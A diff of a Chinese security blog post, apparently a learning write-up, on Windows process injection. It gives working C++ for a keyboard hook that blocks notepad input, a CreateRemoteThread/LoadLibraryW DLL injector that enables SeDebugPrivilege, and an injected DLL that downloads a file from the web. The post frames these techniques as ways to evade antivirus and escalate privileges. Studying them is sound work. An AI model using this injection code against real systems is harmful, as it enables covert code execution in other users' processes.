@@ -18,18 +18,20 @@
   <meta name="author" content="Epiphany">
   <meta name="keywords" content="">
   
-    <meta name="description" content="chat nc 43.96.147.93">
+    <meta name="description" content="从进程注入到提权 windows下的一系列注入手段在免杀和提权上有较大的用处，学习进程注入对Windows安全的理解有重要的帮助。 ¶0x01 什么是进程注入 类似于linux下的ROP，进程注入即为在一个独立活动的进程中地址空间执行任意代码的方式，此时被执行的任意代码可以访问源进程的所有资源空间，常常被用来提权，同时，该方式通过注入正常的进程，常常可以绕过杀软的检测和白名单检测。 从原理上讲，进">
 <meta property="og:type" content="article">
 <meta property="og:title" content="从进程注入到提权">
 <meta property="og:url" content="http://example.com/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/index.html">
 <meta property="og:site_name" content="Epiphany&#39;s blog">
-<meta property="og:description" content="chat nc 43.96.147.93">
+<meta property="og:description" content="从进程注入到提权 windows下的一系列注入手段在免杀和提权上有较大的用处，学习进程注入对Windows安全的理解有重要的帮助。 ¶0x01 什么是进程注入 类似于linux下的ROP，进程注入即为在一个独立活动的进程中地址空间执行任意代码的方式，此时被执行的任意代码可以访问源进程的所有资源空间，常常被用来提权，同时，该方式通过注入正常的进程，常常可以绕过杀软的检测和白名单检测。 从原理上讲，进">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg">
 <meta property="article:published_time" content="2022-06-26T12:07:39.000Z">
-<meta property="article:modified_time" content="2022-06-26T14:43:15.528Z">
+<meta property="article:modified_time" content="2022-06-29T03:21:36.469Z">
 <meta property="article:author" content="Epiphany">
 <meta property="article:tag" content="windows提权">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg">
   
   
   
@@ -234,7 +236,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('https://s1.ax1x.com/2022/06/28/jeNzFS.jpg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -264,7 +266,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          406 字
+          12k 字
         
       </span>
     
@@ -276,7 +278,7 @@
         
         
           <!-- compatible with older versions-->
-          4 分钟
+          102 分钟
         
       </span>
     
@@ -325,22 +327,450 @@
             <h1 style="display: none">从进程注入到提权</h1>
             
             
-              
-              <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再试试nc看看" data-whm="禁止修改">
-  <script id="hbeData" type="hbeData" data-hmacdigest="e655a24e8acb8476c6e1a922f443212b60d5476226df1ab807977e9e778687b7">cc0c0f8ba411acd26894e584ac9b5fda28350dbdee232506489de47537a1ee010219adebb29445624d2725110431a2ec9a554815281e020b8a338e8925a52fe628f0fa47bed5b428e6c660b25c6ee1b7a3f80e0cfa361acc12944fdcbc39a8349d1d1bff3b6f2dafa5f2b63cdfd348bbcfd86e146311d3da8c39cf5d70c0c2f74995d5bbd3bcb8f459ffc4d21a40f0f33263b05a5bf4876b1a7f10e233532073a6ddf5dffc60db285e06542da50a131cde43422d70e38b0f9d3113bdb89e198607590316471d4aae6791de948c975d0ec64be3e811c0e6027404e012557b3ea0acdea3aa82b4254013f409f5183a0e7fbfb68d32434213eefd383209ebf219392c5b417982562fdd6f555b1bf34a51d77ec4d193f4422865950d88692cb2833fd53a5f1ce0467e97b81281576fd9febdb88f1c8cbd7d0ecc9b4237a9836c4a4007919477bcc698230ab93aadd690463a9fb2aab7ed2b263d20c75941cfb204116f9fe85e7d48968dd43c6c0baa6803c53001136b254a76cad40060c38bc6930d8e10d89277ba5ac2c23101b47bddaad3b1b20982e82c02ce37233c54d19bd5875a200b4130188f3fe87feade20a83e49ef61ea08a93529328fabe1710eee9e5b903b74e182d043fd8a140c9f4dba3ad614e0a3e2ca6396a7a40f67bbdc84624695f14f076a790eb6d44d6bca3a39384765e8279a5f92019b202f2fed2ab671d61d9706b82c20fd472b959b349a98ca59a74bafb99c205a29fa0ba8e16f27980e38e5d7ba268d47b0449b8360e6d72b13ed137c2af6d2ca637da54492ae502e7965d0672ad0a864c5d9bebb2f4238df7ecc2cf0fcef918867cbb3ba87ba800b8361bf9d756f24bd4de7c39265f5bd4c47b40f327e8e34ab99be4345fc3e964e8c1268ab64121a0ac61435d6e90a6d866822c824c57a07e2ff965631464fe64e0b450f61723634ef06cb48b9798d0bf92ec55fcf254380e04ed6821539177905f65cb04a5ddabba8784f87c17b4354a45fcb4540caa57e36e9e0ade136a0853b7ddadb5d8fd0d9822390b94d08826b2d925ee054a8f7b4bf5b21d42e29531792976fa936215aad63a595227dd04255825a462ade3bf0037a3af95fa5b5feae6d2b08ddc0e9bfae22554affab1a40767b3c4c9a21108dab44739f00ad06c45eadadc8a3016782f521ff553392807f4fbe533a593e2ea356f2cb42633cb463c8840b403710942443c9e4147b467e2344b62946f114c25b1c6798f04b05e72678dd2fab6f612d462aa0b9cc85207ce39e9c1c9b3926c2fbbed62d7847783048d3f6418764a71d67f30149ed5af900bf7929c993f64b85d5bb69dff6cdd975c5a67549e378ccaa350feb5f23d3928799da7161fbd811e5a9b7d03b139fc783b2c0e74d5656880a9c9481e4245fe54fb7305b785966cdcc6faa6f1852f5793ef06b90fe97f0026611148f2667991d62f521d208492e71ab09724074efd963517d2bac394c32f6576c3f9801df4681753a0d46be067e6478aa80e3d92e156fba268e94526dd20dce86ace1b95e18910f1674387b006aad6b4ea4143f7666f9c10b1e47807d770033498fee866890a82680de34209272208577a53017710227b8be4038d268dc5e406b25157a402f6057427ad65c7bfea97557efe36bc35382ba7634fa3599ef9f7c164c75ff179183da4cb194bd4470a0086db582295ad1f1aa245f7ec15af6214c1331f09f848c3d68f38be39fe6263374b6d8bc93670e8017d3b4596d46a937ff7df3c416ad98febb4cd3d38c032a863441d0f565d4b8f7597e80fdaa5e2fc29c792cecffa3018353a06904d0c3a85c03608648c8adb2b3514d0de4678af8d756e120ad606e816e04fbbb3a24f61ac157f28413fdaf2b15e01cbf8648f7871ae00a7dcce4ef5d9d30f50b11603939beff5a9a7d1e1aad6869b67360530e0a74afdbfb76589c9324a6cbb79789a0b610d1a01e944a09427b7e21f68ea29ec6f911e9dabd2ae4fa15fd0f27ac7b1469ac78cdae36d3f90e17022667b5043069d46b85fc1d051a43593c471b66efbe32583abe5e77934474cd70cf9c8638c2b03c9ccb60a50f7a424c58c44e8180</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">chat nc 43.96.147.93</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
-              
+              <div class="markdown-body">
+                
+                <h1>从进程注入到提权</h1>
+<p>windows下的一系列注入手段在免杀和提权上有较大的用处，学习进程注入对Windows安全的理解有重要的帮助。</p>
+<h2 id="0x01-什么是进程注入"><a class="header-anchor" href="#0x01-什么是进程注入">¶</a>0x01 什么是进程注入</h2>
+<p>类似于linux下的ROP，进程注入即为在一个独立活动的进程中地址空间执行任意代码的方式，此时被执行的任意代码可以访问源进程的所有资源空间，常常被用来提权，同时，该方式通过注入正常的进程，常常可以绕过杀软的检测和白名单检测。</p>
+<p>从原理上讲，进程注入改善了不可见性，同时一些技术也实现了持久性。</p>
+<p>目前大致上有两种注入方法。</p>
+<ul>
+<li>dll注入</li>
+<li>shellcode注入</li>
+</ul>
+<p>个人认为在本质上，二者都是操作系统可以执行的代码，为了方便开发，代码通常会以dll的形式编译和传播，实际上进行注入的时候，作为loadlibrary被加载。</p>
+<p>注入的方式多种多样，这里我们主要看到两种注入的方式，<strong>dll和pe注入</strong></p>
+<h2 id="0x02-几种进程注入的方式"><a class="header-anchor" href="#0x02-几种进程注入的方式">¶</a>0x02 几种进程注入的方式</h2>
+<h3 id="dll编写规则"><a class="header-anchor" href="#dll编写规则">¶</a>dll编写规则</h3>
+<p>首先我们需要了解一下dll的编写规则和一些具体的实现。</p>
+<p>DLL（Dynamic Linkable Library）它提供一些可以直接使用的变量，类和函数。在经历了“无库—静态链接库—动态链接库”的历程后，dll使用十分广泛。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/W_Y2010/article/details/80428067">https://blog.csdn.net/W_Y2010/article/details/80428067</a></p>
+<p>编写规则和之前写过的tinystl差不多，语法也是单纯的c语言语法。有一点不一样的是</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/27/2bb043f58574f84d.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>函数的返回值使用dll的extern 声明，表明后面的函数是dll的导出函数。基本用法就是这样还有一些别的用法不赘述，本次的重点是弄明白dll注入和hook注入和pe注入三种方式。</p>
+<h3 id="hook注入原理"><a class="header-anchor" href="#hook注入原理">¶</a>hook注入原理</h3>
+<p>什么是hook呢？联想glibc中的hook，调用malloc和free之前会查看其中的hook。实际上抽象出来，Windows下的hook机制也和其类似。</p>
+<blockquote>
+<p>hook作为一种消息监听机制，程序可以通过hook对消息或窗口进行监听，，即hook可以和特定的时间挂钩，当应用程序触发该特殊事件之后，操作系统即会向hook发出通知消息，此时hook函数就会响应对应的消息。</p>
+</blockquote>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/27/2974a5f11e3b5ba7.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>这里借用别人的图来解释一下钩子的机制， 在Micrisoft Windows中， 每个进程都有自己的私有地址空间。当我们用指针来引用内存的时候，指针的值表示的是进程自己的自制空间的一个内存地址。进程不能创建一个指针来引用属于其他进程的内存。</p>
+<p>这样虽然一定程度上保证了程序的安全性，但是却也使我们很难编写能够与其他进程通信的应用程序或对其他进程进行操控的应用程序。</p>
+<p>hook就被用来再被调用函数和调用进程中充当一个中间人，用来接受消息，处理消息和转发消息。</p>
+<p>Hook的类型在Windows下也有很多种，消息hook，注入hook，inline内联hook等，hook注入中，<strong>重点学习的是其中的注入hook</strong>，<strong>注入hook</strong>，和hjacking差不多，就是劫持API的调用函数。</p>
+<p>但是前面说了，每个进程有一个私有的内存空间，那么我如果想要A进程hookB进程的函数，但是A又不可以直接访问B的内存空间，那么应该怎么办？</p>
+<p>这个时候考虑到dll动态链接库的注入技术，hook和dll注入结合即可解决这个问题。<strong>把hook的代码写入dll中，让B程序加载dll，则hook即可生效</strong>，乍一看感觉还不如直接shellcode来的实在。一般的注入流程如下：</p>
+<ol>
+<li>安装一个钩子（系统的dll注入被hook）</li>
+<li>保存系统函数入口处的代码</li>
+<li>替换掉进程中的系统函数入口指向我们的函数（直接修改地址空间的字节）</li>
+<li>当系统函数被调用时立即跳转到我们的函数</li>
+<li>函数处理</li>
+<li>恢复系统函数入口的代码（处理后拖钩）</li>
+</ol>
+<p>这时候我们回去看到给的实验代码：</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/420c2138c2b9725b.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>有两个cpp函数，keyhook是编译成dll的cpp，上面是hook程序的exe，也即是A程序。</p>
+<p>实现的内容是，用键盘hook技术拦截notepad.exe进程的键盘消息，使之无法显示在记事本中</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;HookMain
+#include &quot;stdio.h&quot;
+#include &quot;conio.h&quot;
+#include &quot;windows.h&quot;
 
-              
+#define	DEF_DLL_NAME		&quot;KeyHook.dll&quot;
+#define	DEF_HOOKSTART		&quot;HookStart&quot;
+#define	DEF_HOOKSTOP		&quot;HookStop&quot;
+
+typedef void (*PFN_HOOKSTART)();
+typedef void (*PFN_HOOKSTOP)();
+
+void main()
+&#123;
+	HMODULE			hDll &#x3D; NULL; &#x2F;&#x2F;代表应用程序载入的模块,被载入模块的线性地址
+	PFN_HOOKSTART	HookStart &#x3D; NULL;
+	PFN_HOOKSTOP	HookStop &#x3D; NULL;
+	char			ch &#x3D; 0;
+	
+    &#x2F;&#x2F; 加载指定的dll
+	hDll &#x3D; LoadLibraryA(DEF_DLL_NAME);
+    if( hDll &#x3D;&#x3D; NULL )
+    &#123;
+        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());
+        return;
+    &#125;
+
+	HookStart &#x3D; (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);
+	HookStop &#x3D; (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);
+
+	HookStart();
+    
+	printf(&quot;press &#39;q&#39; to quit!\n&quot;);
+	while( _getch() !&#x3D; &#39;q&#39; )	;
+
+	HookStop();
+    
+	FreeLibrary(hDll);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>有一些韩文注释，删掉了。看的有点点不太懂，可能需要看完dll部分才懂。</p>
+<p>大致逻辑就是，先加载目标dll，然后利用<code>GetProcAddress</code> API获得hookstart函数的地址，这里用了强制类型转化，stop地址也是，具体内容需要看dll的实现。估计所有的简单hook都是这样实现的。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;KeyHook
+#include &quot;stdio.h&quot;
+#include &quot;windows.h&quot;
+
+#define DEF_PROCESS_NAME		&quot;notepad.exe&quot;
+
+HINSTANCE g_hInstance &#x3D; NULL;
+HHOOK g_hHook &#x3D; NULL;
+HWND g_hWnd &#x3D; NULL;
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
+&#123;
+	switch( dwReason )
+	&#123;
+        case DLL_PROCESS_ATTACH:
+			g_hInstance &#x3D; hinstDLL;
+			break;
+
+        case DLL_PROCESS_DETACH:
+			break;	
+	&#125;
+
+	return TRUE;
+&#125;
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+&#123;
+	char szPath[MAX_PATH] &#x3D; &#123;0,&#125;;
+	char *p &#x3D; NULL;
+
+	if( nCode &gt;&#x3D; 0 )
+	&#123;
+		&#x2F;&#x2F; bit 31 : 0 &#x3D;&gt; press, 1 &#x3D;&gt; release
+		if( !(lParam &amp; 0x80000000) )&#x2F;&#x2F;释放键盘按键时
+		&#123;
+			GetModuleFileNameA(NULL, szPath, MAX_PATH);
+			p &#x3D; strrchr(szPath, &#39;\\&#39;);
+
+            &#x2F;&#x2F; 比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序（或者下一个钩子）
+			if( !_stricmp(p + 1, DEF_PROCESS_NAME) )
+				return 1;
+		&#125;
+	&#125;
+
+    &#x2F;&#x2F; 如果不是notepad.exe，则调用CallNextHookEx函数，将消息传递给应用程序
+	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
+&#125;
+
+#ifdef __cplusplus
+extern &quot;C&quot; &#123;
+#endif
+	__declspec(dllexport) void HookStart()
+	&#123;
+		g_hHook &#x3D; SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);
+	&#125;
+
+	__declspec(dllexport) void HookStop()
+	&#123;
+		if( g_hHook )
+		&#123;
+			UnhookWindowsHookEx(g_hHook);
+			g_hHook &#x3D; NULL;
+		&#125;
+	&#125;
+#ifdef __cplusplus
+&#125;
+#endif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>实现了三个部分，第一部分是dllmain函数，第二部分是主要的hook函数，第三部分是调用的接口，从HookMain可知，hook是从HookStart开始的。</p>
+<p>了解到<code>SetWindowsHookEx</code>函数，是hook的安装函数，这里就不得不提一下hook在内存中的存在形式了。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rosesmall/p/3248300.html">https://www.cnblogs.com/rosesmall/p/3248300.html</a></p>
+<p>每一个Hook都有一个与之相关联的<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/159417.htm">指针</a>列表，称之为钩子<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/549479.htm">链表</a>，由系统来维护。这个列表的<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/159417.htm">指针</a>指向指定的，应用程序定义的，被Hook子程调用的<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/414773.htm">回调函数</a>，也就是该钩子的各个处理子程。当与指定的Hook类型关联的消息发生时，系统就把这个消息传递到Hook子程。 一些Hook子程可以只监视消息，或者修改消息，或者停止消息的前进，避免这些消息传递到下一个Hook子程或者目的窗口。最后安装的钩子放在链的开始， 而最早安装的钩子放在最后，也就是后加入的先获得控制权。</p>
+<p>Windows 并不要求钩子子程的<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/386432.htm">卸载</a>顺序一定得和安装顺序相反。每当有一个钩子被<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/386432.htm">卸载</a>，Windows 便释放其占用的内存，并更新整个Hook链表。如果程序安装了钩子，但是在尚未<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/386432.htm">卸载</a>钩子之前就结束了，那么系统会自动为它做卸载钩子的操作。</p>
+<p>SetWindowsHookEx函数总会在hook链的开头安装hook子程。当指定类型的Hook监视的事件发生时，系统就调用与这个Hook关联的 Hook链的开头的Hook子程。每一个Hook链中的Hook子程都决定是否把这个事件传递到下一个Hook子程。Hook子程传递事件到下一个 Hook子程需要调用CallNextHookEx函数。</p>
+<p>函数原型如下：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">HHOOK SetWindowsHookEx(
+int idHook, &#x2F;&#x2F; 钩子的类型，即它处理的消息类型
+HOOKPROC lpfn, &#x2F;&#x2F; 钩子子程的地址指针。如果dwThreadId参数为0
+&#x2F;&#x2F; 或是一个由别的进程创建的线程的标识，
+&#x2F;&#x2F; lpfn必须指向DLL中的钩子子程。
+&#x2F;&#x2F; 除此以外，lpfn可以指向当前进程的一段钩子子程代码。
+&#x2F;&#x2F; 钩子函数的入口地址，当钩子钩到任何消息后便调用这个函数。
+HINSTANCE hMod, &#x2F;&#x2F; 应用程序实例的句柄。标识包含lpfn所指的子程的DLL。
+&#x2F;&#x2F; 如果dwThreadId 标识当前进程创建的一个线程，
+&#x2F;&#x2F; 而且子程代码位于当前进程，hMod必须为NULL。
+&#x2F;&#x2F; 可以很简单的设定其为本应用程序的实例句柄。
+DWORD dwThreadId &#x2F;&#x2F; 与安装的钩子子程相关联的线程的标识符。
+&#x2F;&#x2F; 如果为0，钩子子程与所有的线程关联，即为全局钩子。
+);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>把我们创建的钩子函数作为入口地址，钩到消息即传递给该函数。而hook函数就是简单的，劫持notepad的消息，不往下传递，这就导致了notepad的进程按键无法被正确响应。实现了hook。</p>
+<h3 id="dll注入代码分析"><a class="header-anchor" href="#dll注入代码分析">¶</a>dll注入代码分析</h3>
+<p>还是看到注入代码。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;
+#include &quot;tchar.h&quot;
+
+BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) 
+&#123;
+    TOKEN_PRIVILEGES tp;
+    HANDLE hToken;
+    LUID luid;
+
+    if( !OpenProcessToken(GetCurrentProcess(),
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
+			              &amp;hToken) )
+    &#123;
+        _tprintf(L&quot;OpenProcessToken error: %u\n&quot;, GetLastError());
+        return FALSE;
+    &#125;
+
+    if( !LookupPrivilegeValue(NULL,           &#x2F;&#x2F; lookup privilege on local system
+                              lpszPrivilege,  &#x2F;&#x2F; privilege to lookup 
+                              &amp;luid) )        &#x2F;&#x2F; receives LUID of privilege
+    &#123;
+        _tprintf(L&quot;LookupPrivilegeValue error: %u\n&quot;, GetLastError() ); 
+        return FALSE; 
+    &#125;
+
+    tp.PrivilegeCount &#x3D; 1;
+    tp.Privileges[0].Luid &#x3D; luid;
+    if( bEnablePrivilege )
+        tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;
+    else
+        tp.Privileges[0].Attributes &#x3D; 0;
+
+    &#x2F;&#x2F; Enable the privilege or disable all privileges.
+    if( !AdjustTokenPrivileges(hToken, 
+                               FALSE, 
+                               &amp;tp, 
+                               sizeof(TOKEN_PRIVILEGES), 
+                               (PTOKEN_PRIVILEGES) NULL, 
+                               (PDWORD) NULL) )
+    &#123; 
+        _tprintf(L&quot;AdjustTokenPrivileges error: %u\n&quot;, GetLastError() ); 
+        return FALSE; 
+    &#125; 
+
+    if( GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED )
+    &#123;
+        _tprintf(L&quot;The token does not have the specified privilege. \n&quot;);
+        return FALSE;
+    &#125; 
+
+    return TRUE;
+&#125;
+
+BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)
+&#123;
+    HANDLE hProcess &#x3D; NULL, hThread &#x3D; NULL;
+    HMODULE hMod &#x3D; NULL;
+    LPVOID pRemoteBuf &#x3D; NULL;
+    DWORD dwBufSize &#x3D; (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
+    LPTHREAD_START_ROUTINE pThreadProc;
+
+    &#x2F;&#x2F; #1. dwPID notepad.exe
+    if ( !(hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
+    &#123;
+        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;, dwPID, GetLastError());
+        return FALSE;
+    &#125;
+
+    &#x2F;&#x2F; #2.分配一块内存在目标进程中，用来存储dll的路径，设置权限为读写。
+    pRemoteBuf &#x3D; VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
+
+    &#x2F;&#x2F; #3. 写入路径
+    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);
+
+    &#x2F;&#x2F; #4. LoadLibraryA() API 
+    hMod &#x3D; GetModuleHandle(L&quot;kernel32.dll&quot;);
+    pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);
+	
+    &#x2F;&#x2F; #5. notepad.exe 
+    hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
+    WaitForSingleObject(hThread, INFINITE);	
+
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+    return TRUE;
+&#125;
+
+int _tmain(int argc, TCHAR *argv[])
+&#123;
+    if( argc !&#x3D; 3)
+    &#123;
+        _tprintf(L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;, argv[0]);
+        return 1;
+    &#125;
+
+    &#x2F;&#x2F; change privilege
+    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )
+        return 1;
+
+    &#x2F;&#x2F; inject dll
+    if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) )
+        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;, argv[2]);
+    else
+        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;, argv[2]);
+
+    return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>看main函数的usage就知道这是一个对指定pid注入指定dll的程序。</p>
+<p>重点看到injectdll函数，<code>SetPrivilege</code>被用来设定权限。</p>
+<p><code>pRemoteBuf =  VirtualAllocEx(hProcess,NULL,dwBufSize,MEM_COMMIT,PAGE_READWRITE)</code>将要注入的dll路径写入目标进程内存。因为任何内存空间都无法写入，所以调用<code>VirtualAllocEx（）</code>在目标进程分配一块缓冲区，指定缓冲区大小为dll文件路径长度。同时设定权限为读写。</p>
+<p>写入路径之后，调用了线程函数<code>hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);</code>创建远程线程，线程属于pProcess，还有一些参数，LoadLibraryW的地址和dll路径的地址。</p>
+<p>看到dll代码</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;
+#include &quot;tchar.h&quot;
+
+#pragma comment(lib, &quot;urlmon.lib&quot;)
+
+#define DEF_URL     	(L&quot;http:&#x2F;&#x2F;www.naver.com&#x2F;index.html&quot;)
+#define DEF_FILE_NAME   (L&quot;index.html&quot;)
+
+HMODULE g_hMod &#x3D; NULL;
+
+DWORD WINAPI ThreadProc(LPVOID lParam)
+&#123;
+    TCHAR szPath[_MAX_PATH] &#x3D; &#123;0,&#125;;
+
+    if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )
+        return FALSE;
+	
+    TCHAR *p &#x3D; _tcsrchr( szPath, &#39;\\&#39; );
+    if( !p )
+        return FALSE;
+
+    _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME);
+
+    URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL);
+
+    return 0;
+&#125;
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+&#123;
+    HANDLE hThread &#x3D; NULL;
+
+    g_hMod &#x3D; (HMODULE)hinstDLL;
+
+    switch( fdwReason )
+    &#123;
+    case DLL_PROCESS_ATTACH : 
+        OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;);
+        hThread &#x3D; CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
+        CloseHandle(hThread);
+        break;
+    &#125;
+
+    return TRUE;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>这个就比较简单了，意思就是调用指定的API下载指定的文件到指定的地点。</p>
+<p>综上：注入的main函数，创建一个新线程加载指定路径的dll，而该dll实现远程下载的功能。</p>
+<p>这里利用了一个Windows os下的特性，由于要使得指定的线程加载，则需要知道目标线程的API函数地址，但是在Windows中，因为OS核心dll会被加载到自身固定的地址，dll注入利用的就是window OS的这一特性。所以，导入InjectDll.exe进程中的LoadLibraryW（）地址与导入notepad.exe进程中的LoadLibraryW（）地址是相同的。</p>
+<h2 id="0x03-实践"><a class="header-anchor" href="#0x03-实践">¶</a>0x03 实践</h2>
+<h3 id="hook实践"><a class="header-anchor" href="#hook实践">¶</a>hook实践</h3>
+<p>这里看到响应函数，更改为如下:</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/d8020a30306069b8.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>弹出计算器可能效果更加直观。</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/a05ba7f4c9734402.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>进程名字改为notepad++.exe，然后使用g++编译代码。</p>
+<p><code> g++ --share ai.cpp -o ai.dll</code></p>
+<p>编译完毕之后，把dll和exe放在一个目录下，然后运行exe</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/jeNzFS"><img src="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg" srcset="/img/loading.gif" lazyload alt="jeNzFS.jpg"></a></p>
+<p>hook成功</p>
+<h3 id="dll实践"><a class="header-anchor" href="#dll实践">¶</a>dll实践</h3>
+<p>同样的方式，编译代码，注意修改，使得可以弹出计算器。</p>
